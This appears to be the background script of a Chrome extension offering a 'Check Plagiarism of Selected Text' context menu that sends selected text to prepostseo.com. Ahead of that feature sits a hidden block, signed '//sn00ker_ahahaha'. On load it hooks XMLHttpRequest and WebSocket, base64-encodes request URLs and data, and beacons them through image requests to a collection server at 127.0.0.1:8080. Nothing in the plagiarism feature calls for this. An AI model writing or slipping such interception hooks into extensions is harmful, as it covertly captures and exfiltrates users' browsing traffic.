function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var contextsList = ["selection"];

    for(i = 0;i<contextsList.length; i++){
        var context = contextsList[i];
        var titleX = " Check Plagiarism of Selected Text";
        chrome.contextMenus.create({title: titleX, contexts:[context], onclick: clickHandler, id: context });
    }

        function clickHandler(data, tab) {
         switch(data.menuItemId){
            case 'selection' :
              chrome.tabs.create({url: "https://www.prepostseo.com/plagiarism-checker?text="+encodeURIComponent(data.selectionText)+ "&utm_source=gc&utm_medium=plagiarism&utm_campaign=extension"});
               
			   break;
            }

         }
		 
	